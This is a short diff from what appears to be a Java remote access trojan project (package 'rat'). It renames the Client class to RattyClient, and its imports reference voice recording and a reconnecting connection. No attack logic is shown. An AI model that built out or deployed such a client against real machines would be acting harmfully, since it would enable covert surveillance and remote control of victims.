@@ -19,7 +19,7 @@ import de.sogomn.rat.packet.VoicePacket;
 import de.sogomn.rat.util.Constants;
 import de.sogomn.rat.util.VoiceRecorder;
 
-public final class Client implements IConnectionObserver, IGuiController {
+public final class RattyClient implements IConnectionObserver, IGuiController {
 	
 	private ActiveConnection connection;
 	
@@ -29,7 +29,7 @@ public final class Client implements IConnectionObserver, IGuiController {
 	private static final int VOICE_BUFFER_SIZE = 1024 << 8;
 	private static final int CONNECTION_INTERVAL = 5000;
 	
-	public Client(final ActiveConnection connection) {
+	public RattyClient(final ActiveConnection connection) {
 		this.connection = connection;
 		
 		chat = new ChatWindow();
@@ -149,7 +149,7 @@ public final class Client implements IConnectionObserver, IGuiController {
 			return;
 		}
 		
-		final Client client = new Client(connection);
+		final RattyClient client = new RattyClient(connection);
 		
 		connection.setObserver(client);
 		connection.start();
@@ -176,7 +176,7 @@ public final class Client implements IConnectionObserver, IGuiController {
 			return;
 		}
 		
-		final Client client = new Client(connection);
+		final RattyClient client = new RattyClient(connection);
 		
 		connection.setObserver(client);
 		connection.start();
